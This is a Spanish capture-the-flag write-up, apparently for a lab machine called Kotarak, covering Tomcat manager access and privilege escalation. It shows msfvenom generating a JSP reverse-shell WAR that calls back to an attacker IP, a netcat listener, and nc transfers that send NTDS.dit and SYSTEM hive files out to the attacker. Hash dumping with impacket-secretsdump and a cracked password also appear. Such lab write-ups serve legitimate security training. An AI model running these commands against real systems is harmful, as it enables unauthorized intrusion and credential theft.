## Vuln exploit & Gaining Access {-}

### Conneccion en el panel de administracion de Tomcat {-}

Como todos los servicios tomcat, el panel de administracion se encuentra en la routa `/manager/html`

lo miramos en la url `http://10.10.10.55:8080/manager/html`

Una vez ganado el accesso al panel de administracion de tomcat, ya savemos que podemos subir un **war**
malicioso.

```bash
msfvenom -l payload | grep "jsp"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f war -o reverse.war
```

subimos el fichero en la web.

Nos ponemos en escucha con netcat por el puerto 443

```bash
nc -nlvp 443
```

Pinchamos el fichero reverse.war y vemos que ya hemos ganado acceso al systema

```bash
whoami

> tomcat
```

### Tratamiento de la TTY {-}

```bash
which python
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `cd /home` vemos que hay dos usuarios tomcat y atanas

```bash
find \-name user.txt 2>/dev/null | xargs cat
```

Vemos que la flag esta en el directorio **atanas** y que no podemos leer la flag

### User pivoting al usuario atanas {-}

```bash
cd tomcat
ls -la
cd to_archive
ls -la
cd pentest_data
ls -la
file *
```

Aqui vemos que hay dos ficheros y con el commando `file` vemos que hay un fichero data y un MS Windows registry file NT/2000.
Nos traemos estos dos ficheros a nuestro equipo de atacante.

1. en la maquina de atacante

    ```bash
    nc -nlvp 443 > ntds.bin
    ```

1. en la maquina victima

    ```bash
    nc 10.10.14.6 443 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
    ```

1. en la maquina de atacante

    ```bash
    nc -nlvp 443 > ntds.dit
    ```

1. en la maquina victima

    ```bash
    nc 10.10.14.6 443 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
    ```

#### Recuperando hashes nt desde ficheros Active Directories {-}

```bash
mv ntds.dit ntds
mv ntds.bin SYSTEM
impacket-secretsdump -ntds ntds -system SYSTEM LOCAL
```

Aqui copiamos los diferentes hashes en un fichero llamado hash

```{r, echo = FALSE, fig.cap="hashes ntds", out.width="90%"}
    knitr::include_graphics("images/Kotrarak-hashes.png")
```

cat hash | awk '{print $4}' FS=":" y copiamos los hashes en la pagina [crack station](https://crackstation.net/)

```{r, echo = FALSE, fig.cap="hashes crackstation", out.width="90%"}
    knitr::include_graphics("images/Kotarak-crackstation.png")
```

intentamos las contraseñas para pasar al usuario atanas

```bash
su atanas
Password: f16tomcat!
whoami
> atanas
```

y ya podemos ver la flag
